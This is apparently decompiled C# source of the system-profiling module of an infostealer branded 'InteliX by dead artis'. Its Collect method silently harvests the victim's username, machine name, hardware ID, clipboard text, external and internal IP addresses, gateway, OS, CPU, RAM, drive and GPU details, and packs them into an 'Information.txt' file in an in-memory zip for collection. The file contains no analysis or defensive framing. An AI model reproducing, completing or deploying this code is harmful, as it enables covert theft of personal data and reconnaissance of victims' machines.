using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Device
{
	// Token: 0x02000033 RID: 51
	internal class SystemInfo : ITarget
	{
		// Token: 0x06000093 RID: 147 RVA: 0x00007C38 File Offset: 0x00005E38
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.AppendLine("    ____      __       _______  __");
				stringBuilder.AppendLine("   /  _/___  / /____  / /  _/ |/ /");
				stringBuilder.AppendLine("   / // __ \\/ __/ _ \\/ // / |   / ");
				stringBuilder.AppendLine(" _/ // / / / /_/  __/ // / /   |  ");
				stringBuilder.AppendLine("/___/_/ /_/\\__/\\___/_/___//_/|_|  ");
				stringBuilder.AppendLine("                                  ");
				stringBuilder.AppendLine();
				stringBuilder.AppendLine("               InteliX by dead artis");
				stringBuilder.AppendLine();
				Task<string> task = Task.Run<string>(() => SystemInfo.BuildUserSection());
				Task<string> task2 = Task.Run<string>(() => SystemInfo.BuildNetworkSection());
				Task<string> task3 = Task.Run<string>(() => SystemInfo.BuildSystemSection());
				Task<string> task4 = Task.Run<string>(() => SystemInfo.BuildDrivesSection());
				Task<string> task5 = Task.Run<string>(() => SystemInfo.BuildGpuSection());
				Task<string> task6 = Task.Run<string>(() => SystemInfo.BuildBasicSection());
				Task.WaitAll(new Task[]
				{
					task,
					task2,
					task3,
					task4,
					task5,
					task6
				});
				StringBuilder stringBuilder2 = new StringBuilder();
				stringBuilder2.Append(stringBuilder);
				stringBuilder2.AppendLine(task.Result).AppendLine();
				stringBuilder2.AppendLine(task2.Result).AppendLine();
				stringBuilder2.AppendLine(task3.Result).AppendLine();
				stringBuilder2.AppendLine(task4.Result).AppendLine();
				stringBuilder2.AppendLine(task5.Result).AppendLine();
				stringBuilder2.AppendLine(task6.Result);
				zip.AddTextFile("Information.txt", stringBuilder2.ToString());
			}
			catch
			{
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00007E70 File Offset: 0x00006070
		private static string BuildUserSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[User Info]");
			try
			{
				stringBuilder.AppendLine("User: " + Environment.UserName);
				stringBuilder.AppendLine("Machine: " + Environment.MachineName);
				stringBuilder.AppendLine(string.Format("Now: {0:yyyy-MM-dd HH:mm:ss}", DateTime.Now));
			}
			catch
			{
				stringBuilder.AppendLine("User/System fields unavailable");
			}
			try
			{
				InputLanguage currentInputLanguage = InputLanguage.CurrentInputLanguage;
				string text;
				if (currentInputLanguage == null)
				{
					text = null;
				}
				else
				{
					CultureInfo culture = currentInputLanguage.Culture;
					text = ((culture != null) ? culture.TwoLetterISOLanguageName : null);
				}
				string str = text ?? "unknown";
				stringBuilder.AppendLine("Input ISO: " + str);
			}
			catch
			{
				stringBuilder.AppendLine("Input ISO: unknown");
			}
			stringBuilder.AppendLine("Hwid: " + HwidGenerator.GetHwid());
			stringBuilder.AppendLine("Clipboard: " + SystemInfo.GetClipboardTextNoTimeout());
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00007F98 File Offset: 0x00006198
		private static string BuildNetworkSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Network]");
			stringBuilder.AppendLine("External IP: " + IpApi.GetPublicIp());
			string text = "unavailable";
			string text2 = "unavailable";
			try
			{
				NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
				foreach (NetworkInterface networkInterface in allNetworkInterfaces)
				{
					bool flag = networkInterface.OperationalStatus != OperationalStatus.Up || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback;
					if (!flag)
					{
						IPInterfaceProperties ipproperties = networkInterface.GetIPProperties();
						foreach (UnicastIPAddressInformation unicastIPAddressInformation in ipproperties.UnicastAddresses)
						{
							bool flag2 = unicastIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork;
							if (flag2)
							{
								text = unicastIPAddressInformation.Address.ToString();
								break;
							}
						}
						foreach (GatewayIPAddressInformation gatewayIPAddressInformation in ipproperties.GatewayAddresses)
						{
							bool flag3 = gatewayIPAddressInformation.Address != null && gatewayIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork;
							if (flag3)
							{
								text2 = gatewayIPAddressInformation.Address.ToString();
								break;
							}
						}
						bool flag4 = text != "unavailable" && text2 != "unavailable";
						if (flag4)
						{
							break;
						}
					}
				}
			}
			catch
			{
			}
			stringBuilder.AppendLine("Internal IP: " + text);
			stringBuilder.AppendLine("Default Gateway: " + text2);
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000096 RID: 150 RVA: 0x000081A4 File Offset: 0x000063A4
		private static string BuildSystemSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[System]");
			try
			{
				stringBuilder.AppendLine("OS Product: " + WindowsInfo.GetProductName());
				stringBuilder.AppendLine("OS Build: " + WindowsInfo.GetBuildNumber());
				stringBuilder.AppendLine("OS Arch: " + WindowsInfo.GetArchitecture());
			}
			catch
			{
				stringBuilder.AppendLine("OS: unavailable");
			}
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"))
				{
					string text;
					if ((text = (((registryKey != null) ? registryKey.GetValue("ProcessorNameString") : null) as string)) == null)
					{
						text = ((((registryKey != null) ? registryKey.GetValue("VendorIdentifier") : null) as string) ?? "Unknown");
					}
					string str = text;
					stringBuilder.AppendLine("CPU Name: " + str);
					stringBuilder.AppendLine(string.Format("Logical Cores: {0}", Environment.ProcessorCount));
				}
			}
			catch
			{
				stringBuilder.AppendLine("CPU: unavailable");
			}
			try
			{
				NativeMethods.MEMORYSTATUSEX memorystatusex = new NativeMethods.MEMORYSTATUSEX
				{
					dwLength = (uint)Marshal.SizeOf(typeof(NativeMethods.MEMORYSTATUSEX))
				};
				bool flag = NativeMethods.GlobalMemoryStatusEx(ref memorystatusex);
				if (flag)
				{
					ulong num = memorystatusex.ullTotalPhys / 1024UL / 1024UL;
					ulong num2 = memorystatusex.ullAvailPhys / 1024UL / 1024UL;
					stringBuilder.AppendLine(string.Format("RAM Total (MB): {0}", num));
					stringBuilder.AppendLine(string.Format("RAM Available (MB): {0}", num2));
				}
				else
				{
					stringBuilder.AppendLine("RAM: unavailable");
				}
			}
			catch
			{
				stringBuilder.AppendLine("RAM: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000083B4 File Offset: 0x000065B4
		private static string BuildDrivesSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Drives]");
			try
			{
				List<string> list = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).Select(delegate(DriveInfo d)
				{
					long num = d.TotalSize / 1024L / 1024L / 1024L;
					long num2 = d.TotalFreeSpace / 1024L / 1024L / 1024L;
					return string.Format("{0} {1} FS:{2} Size:{3}GB Free:{4}GB", new object[]
					{
						d.Name.TrimEnd(new char[]
						{
							'\\'
						}),
						d.DriveType,
						d.DriveFormat,
						num,
						num2
					});
				}).ToList<string>();
				bool flag = list.Any<string>();
				if (flag)
				{
					foreach (string value in list)
					{
						stringBuilder.AppendLine(value);
					}
				}
				else
				{
					stringBuilder.AppendLine("No ready drives");
				}
			}
			catch
			{
				stringBuilder.AppendLine("Drives: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000084C4 File Offset: 0x000066C4
		private static string BuildGpuSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[GPU]");
			try
			{
				List<string> gpuNames = SystemInfo.GetGpuNames();
				bool flag = gpuNames.Any<string>();
				if (flag)
				{
					foreach (string value in gpuNames)
					{
						stringBuilder.AppendLine(value);
					}
				}
				else
				{
					stringBuilder.AppendLine("None");
				}
			}
			catch
			{
				stringBuilder.AppendLine("GPUs: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00008588 File Offset: 0x00006788
		private static string BuildBasicSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Basic]");
			try
			{
				stringBuilder.AppendLine("User Domain: " + Environment.UserDomainName);
			}
			catch
			{
				stringBuilder.AppendLine("User Domain: unavailable");
			}
			try
			{
				stringBuilder.AppendLine(string.Format("CLR Version: {0}", Environment.Version));
			}
			catch
			{
				stringBuilder.AppendLine("CLR Version: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00008630 File Offset: 0x00006830
		private static string GetClipboardTextNoTimeout()
		{
			string result = string.Empty;
			try
			{
				Thread thread = new Thread(delegate()
				{
					try
					{
						bool flag = Clipboard.ContainsText();
						if (flag)
						{
							result = Clipboard.GetText();
						}
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.IsBackground = true;
				thread.Start();
				thread.Join();
			}
			catch
			{
			}
			return result ?? string.Empty;
		}

		// Token: 0x0600009B RID: 155 RVA: 0x000086AC File Offset: 0x000068AC
		private static List<string> GetGpuNames()
		{
			List<string> list = new List<string>();
			try
			{
				uint num = 0U;
				NativeMethods.DISPLAY_DEVICE display_DEVICE = default(NativeMethods.DISPLAY_DEVICE);
				display_DEVICE.cb = Marshal.SizeOf<NativeMethods.DISPLAY_DEVICE>(display_DEVICE);
				while (NativeMethods.EnumDisplayDevices(null, num, ref display_DEVICE, 0U))
				{
					bool flag = !string.IsNullOrWhiteSpace(display_DEVICE.DeviceString);
					if (flag)
					{
						list.Add(display_DEVICE.DeviceString.Trim());
					}
					num += 1U;
					display_DEVICE = new NativeMethods.DISPLAY_DEVICE
					{
						cb = Marshal.SizeOf(typeof(NativeMethods.DISPLAY_DEVICE))
					};
				}
			}
			catch
			{
			}
			return list.Distinct<string>().ToList<string>();
		}
	}
}
